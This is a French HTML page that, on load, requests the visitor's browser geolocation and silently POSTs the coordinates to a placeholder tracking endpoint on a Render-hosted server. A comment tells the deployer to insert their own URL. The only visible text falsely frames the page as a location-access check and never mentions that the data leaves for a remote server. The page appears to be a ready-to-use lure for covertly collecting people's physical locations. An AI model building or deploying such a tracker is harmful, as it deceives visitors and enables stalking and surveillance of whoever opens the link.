<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vérification de la localisation</title>
    <script>
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
            } else {
                alert("La géolocalisation n'est pas supportée par ce navigateur.");
            }
        }

        function sendLocation(position) {
            const data = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy
            };

            // Envoi des données à l'API backend (Node.js)
            fetch('https://tonserveur.render.com/track', {  // Remplace par l'URL de ton application Render
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            })
            .then(response => response.json())
            .then(data => {
                console.log("Données envoyées avec succès", data);
            })
            .catch(error => {
                console.error("Erreur lors de l'envoi des données", error);
            });
        }

        function handleError(error) {
            alert("Erreur de géolocalisation : " + error.message);
        }

        // Demander la localisation quand la page est chargée
        window.onload = function() {
            getLocation();
        };
    </script>
</head>
<body>
    <h1>Vérification de l'accès à la localisation...</h1>
</body>
</html>
